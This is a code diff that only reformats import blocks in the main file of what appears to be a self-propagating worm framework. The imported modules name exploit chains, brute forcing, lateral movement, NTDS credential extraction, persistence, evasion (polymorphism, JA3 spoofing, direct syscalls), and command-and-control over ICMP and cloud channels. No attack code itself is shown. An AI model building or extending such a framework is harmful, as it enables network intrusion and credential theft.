@@ -25,7 +25,6 @@ sys.path.append(PROJECT_ROOT)
 
 from configs.config import Config
 from rl_engine import PropagationAgent, RealWorldPropagationAgent
-
 from scanner import HostClassifier, IntelligentScanner
 from utils.logger import logger
 
@@ -33,6 +32,7 @@ WORM_FILE_PATH = os.path.abspath(__file__)
 
 try:
     from exploits.contextual_bandit import ContextualBandit
+
     CONTEXTUAL_BANDIT_AVAILABLE = True
 except ImportError:
     CONTEXTUAL_BANDIT_AVAILABLE = False
@@ -40,6 +40,7 @@ except ImportError:
 
 try:
     from evasion.evasion_model import EvasionModel
+
     EVASION_MODEL_AVAILABLE = True
 except ImportError:
     EVASION_MODEL_AVAILABLE = False
@@ -47,6 +48,7 @@ except ImportError:
 
 try:
     from scanner.professional_scanner import ProfessionalScanner, ServiceDetector
+
     PRO_SCANNER_AVAILABLE = True
 except ImportError:
     PRO_SCANNER_AVAILABLE = False
@@ -55,6 +57,7 @@ except ImportError:
 
 try:
     from exploits.brute_force_engine import BruteForceEngine, PasswordGenerator
+
     BRUTE_FORCE_AVAILABLE = True
 except ImportError:
     BRUTE_FORCE_AVAILABLE = False
@@ -63,6 +66,7 @@ except ImportError:
 
 try:
     from exploits.exploit_engine import ExploitChain, VulnerabilityScanner
+
     EXPLOIT_ENGINE_AVAILABLE = True
 except ImportError:
     EXPLOIT_ENGINE_AVAILABLE = False
@@ -71,6 +75,7 @@ except ImportError:
 
 try:
     from exploits.async_exploit import AsyncExploitDispatcher
+
     ASYNC_EXPLOIT_AVAILABLE = True
 except ImportError:
     ASYNC_EXPLOIT_AVAILABLE = False
@@ -78,6 +83,7 @@ except ImportError:
 
 try:
     from core.knowledge_graph import NetworkKnowledgeGraph
+
     KNOWLEDGE_GRAPH_AVAILABLE = True
 except ImportError:
     KNOWLEDGE_GRAPH_AVAILABLE = False
@@ -85,6 +91,7 @@ except ImportError:
 
 try:
     from post_exploit.lateral_movement import LateralMovementEngine
+
     LATERAL_MOVEMENT_AVAILABLE = True
 except ImportError:
     LATERAL_MOVEMENT_AVAILABLE = False
@@ -92,6 +99,7 @@ except ImportError:
 
 try:
     from evasion.polymorphic_engine import PolymorphicEngine
+
     POLYMORPHIC_AVAILABLE = True
 except ImportError:
     POLYMORPHIC_AVAILABLE = False
@@ -99,6 +107,7 @@ except ImportError:
 
 try:
     from utils.audit_report import AuditReportGenerator
+
     AUDIT_REPORT_AVAILABLE = True
 except ImportError:
     AUDIT_REPORT_AVAILABLE = False
@@ -106,6 +115,7 @@ except ImportError:
 
 try:
     from monitoring.cli_monitor import CLIMonitor, WormActivityBridge
+
     CLI_MONITOR_AVAILABLE = True
 except ImportError:
     CLI_MONITOR_AVAILABLE = False
@@ -114,6 +124,7 @@ except ImportError:
 
 try:
     from c2.multi_protocol_c2 import MultiProtocolC2
+
     C2_AVAILABLE = True
 except ImportError:
     C2_AVAILABLE = False
@@ -121,6 +132,7 @@ except ImportError:
 
 try:
     from monitoring.host_monitor import HostMonitor, HostState
+
     HOST_MONITOR_AVAILABLE = True
 except ImportError:
     HOST_MONITOR_AVAILABLE = False
@@ -129,6 +141,7 @@ except ImportError:
 
 try:
     from core.predictive_recon import BayesianNetworkAnalyzer, PredictiveScanner
+
     PREDICTIVE_RECON_AVAILABLE = True
 except ImportError:
     PREDICTIVE_RECON_AVAILABLE = False
@@ -137,6 +150,7 @@ except ImportError:
 
 try:
     from exploits.adaptive_exploit_selector import AdaptiveExploitSelector
+
     ADAPTIVE_EXPLOIT_AVAILABLE = True
 except ImportError:
     ADAPTIVE_EXPLOIT_AVAILABLE = False
@@ -144,6 +158,7 @@ except ImportError:
 
 try:
     from core.distributed_redundancy import DistributedRedundancy
+
     DISTRIBUTED_REDUNDANCY_AVAILABLE = True
 except ImportError:
     DISTRIBUTED_REDUNDANCY_AVAILABLE = False
@@ -151,6 +166,7 @@ except ImportError:
 
 try:
     from evasion.traffic_mimicry import TrafficMimicryEngine
+
     TRAFFIC_MIMICRY_AVAILABLE = True
 except ImportError:
     TRAFFIC_MIMICRY_AVAILABLE = False
@@ -158,6 +174,7 @@ except ImportError:
 
 try:
     from evasion.semantic_polymorphism import SemanticPolymorphicEngine
+
     SEMANTIC_POLYMORPHISM_AVAILABLE = True
 except ImportError:
     SEMANTIC_POLYMORPHISM_AVAILABLE = False
@@ -165,6 +182,7 @@ except ImportError:
 
 try:
     from core.dormant_cells import DormantCellManager
+
     DORMANT_CELLS_AVAILABLE = True
 except ImportError:
     DORMANT_CELLS_AVAILABLE = False
@@ -172,6 +190,7 @@ except ImportError:
 
 try:
     from core.wave_propagation import SelfCopyTransfer
+
     SELF_COPY_AVAILABLE = True
 except ImportError:
     SELF_COPY_AVAILABLE = False
@@ -179,6 +198,7 @@ except ImportError:
 
 try:
     from post_exploit.payload_deployer import PayloadDeployer
+
     PAYLOAD_DEPLOYER_AVAILABLE = True
 except ImportError:
     PAYLOAD_DEPLOYER_AVAILABLE = False
@@ -186,6 +206,7 @@ except ImportError:
 
 try:
     from post_exploit.remote_persistence import PersistenceEngine
+
     REMOTE_PERSISTENCE_AVAILABLE = True
 except ImportError:
     REMOTE_PERSISTENCE_AVAILABLE = False
@@ -193,6 +214,7 @@ except ImportError:
 
 try:
     from infection.enhanced_infection import InfectionEngine
+
     INFECTION_ENGINE_AVAILABLE = True
 except ImportError:
     INFECTION_ENGINE_AVAILABLE = False
@@ -200,6 +222,7 @@ except ImportError:
 
 try:
     from c2.cloud_c2 import CloudC2Manager
+
     CLOUD_C2_AVAILABLE = True
 except ImportError:
     CLOUD_C2_AVAILABLE = False
@@ -207,6 +230,7 @@ except ImportError:
 
 try:
     from post_exploit.dcom_lateral import DCOMLateral
+
     DCOM_LATERAL_AVAILABLE = True
 except ImportError:
     DCOM_LATERAL_AVAILABLE = False
@@ -214,6 +238,7 @@ except ImportError:
 
 try:
     from post_exploit.vss_ntds import VSSNTDSExtractor
+
     VSS_NTDS_AVAILABLE = True
 except ImportError:
     VSS_NTDS_AVAILABLE = False
@@ -221,6 +246,7 @@ except ImportError:
 
 try:
     from evasion.ja3_spoof import JA3Spoofer
+
     JA3_SPOOF_AVAILABLE = True
 except ImportError:
     JA3_SPOOF_AVAILABLE = False
@@ -228,6 +254,7 @@ except ImportError:
 
 try:
     from c2.icmp_tunnel import ICMPTunnel
+
     ICMP_TUNNEL_AVAILABLE = True
 except ImportError:
     ICMP_TUNNEL_AVAILABLE = False
@@ -235,6 +262,7 @@ except ImportError:
 
 try:
     from evasion.direct_syscalls import DirectSyscalls
+
     DIRECT_SYSCALLS_AVAILABLE = True
 except ImportError:
     DIRECT_SYSCALLS_AVAILABLE = False
@@ -242,6 +270,7 @@ except ImportError:
 
 try:
     from evasion.sleep_obfuscation import SleepObfuscator
+
     SLEEP_OBFUSCATOR_AVAILABLE = True
 except ImportError:
     SLEEP_OBFUSCATOR_AVAILABLE = False
@@ -249,6 +278,7 @@ except ImportError:
 
 try:
     from monitoring.multi_operator import MultiOperatorServer
+
     MULTI_OPERATOR_AVAILABLE = True
 except ImportError:
     MULTI_OPERATOR_AVAILABLE = False
@@ -256,6 +286,7 @@ except ImportError:
 
 try:
     from utils.mitre_mapper import MITREMapper
+
     MITRE_MAPPER_AVAILABLE = True
 except ImportError:
     MITRE_MAPPER_AVAILABLE = False
@@ -263,6 +294,7 @@ except ImportError:
 
 try:
     from core.plugin_system import PluginManager
+
     PLUGIN_SYSTEM_AVAILABLE = True
 except ImportError:
     PLUGIN_SYSTEM_AVAILABLE = False
@@ -270,6 +302,7 @@ except ImportError:
 
 try:
     from post_exploit.local_persistence import AdvancedPersistence, PersistenceManager
+
     LOCAL_PERSISTENCE_AVAILABLE = True
 except ImportError:
     LOCAL_PERSISTENCE_AVAILABLE = False
@@ -278,6 +311,7 @@ except ImportError:
 
 try:
     from core.adaptive_cycle import AdaptiveCycle
+
     ADAPTIVE_CYCLE_AVAILABLE = True
 except ImportError:
     ADAPTIVE_CYCLE_AVAILABLE = False
@@ -285,6 +319,7 @@ except ImportError:
 
 try:
     from swarm.multi_agent import SwarmAgent, SwarmCoordinator
+
     SWARM_AVAILABLE = True
 except ImportError:
     SWARM_AVAILABLE = False
@@ -293,6 +328,7 @@ except ImportError:
 
 try:
     from payloads.payload_manager import PayloadManager
+
     PAYLOAD_MANAGER_AVAILABLE = True
 except ImportError:
     PAYLOAD_MANAGER_AVAILABLE = False
@@ -300,6 +336,7 @@ except ImportError:
 
 try:
     from exploits.fuzzing_engine import FuzzingEngine
+
     FUZZING_ENGINE_AVAILABLE = True
 except ImportError:
     FUZZING_ENGINE_AVAILABLE = False
@@ -307,6 +344,7 @@ except ImportError:
 
 try:
     from c2.pfs_crypto import PFSCrypto
+
     PFS_CRYPTO_AVAILABLE = True
 except ImportError:
     PFS_CRYPTO_AVAILABLE = False
